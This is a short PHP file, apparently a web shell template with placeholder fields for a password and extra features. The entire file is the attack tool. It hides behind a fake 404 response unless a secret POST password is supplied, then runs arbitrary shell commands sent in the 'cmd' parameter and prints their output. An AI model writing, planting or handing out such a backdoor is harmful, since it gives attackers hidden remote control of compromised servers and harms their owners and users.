<?php
if(!isset($_POST['[password_field]'])||$_POST['[password_field]']!=='[password]'){
  http_response_code(404);die();
}
if(isset($_POST['cmd'])){
  echo '<pre>'.htmlspecialchars(shell_exec($_POST['cmd'])).'</pre>';
}
[features]
?>
